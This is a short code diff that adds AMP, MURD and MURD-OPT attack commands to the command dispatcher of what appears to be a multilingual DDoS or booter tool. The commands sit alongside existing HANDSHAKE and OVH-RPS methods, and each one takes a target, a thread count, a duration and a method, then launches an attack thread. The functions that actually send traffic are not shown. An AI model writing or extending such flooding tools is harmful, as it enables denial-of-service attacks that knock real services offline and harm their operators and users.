@@ -64,6 +64,24 @@ def controler():
             threading.Thread(target=type_sender,args=('HANDSHAKE',f'{target} {thread} {times} {meths}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['HANDSHAKE']))
+        elif a in ['AMP','أمب','ขยาย']:
+           if len(com) == 5:
+            target = com[1]; times = com[2]; thread = com[3]; meths = com[4]
+            threading.Thread(target=type_sender,args=('AMP',f'{target} {thread} {times} {meths}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['AMP']))
+        elif a == 'MURD':
+           if len(com) == 4:
+            target = com[1]; thread = com[2]; meths = com[3]
+            threading.Thread(target=type_sender,args=('MURD',f'{target} {thread} {meths}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['MURD']))
+        elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:
+           if len(com) == 4:
+            target = com[1]; thread = com[2]; meths = com[3]
+            threading.Thread(target=type_sender,args=('MURD_OPT',f'{target} {thread} {meths}')).start()
+            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
+           else:print(format_banner(languages['METHODS']['MURDOPT']))
         elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:
            if len(com) == 6:
             target = com[1]; port = com[2]; times = com[3]; thread = com[4]; booters = com[5]
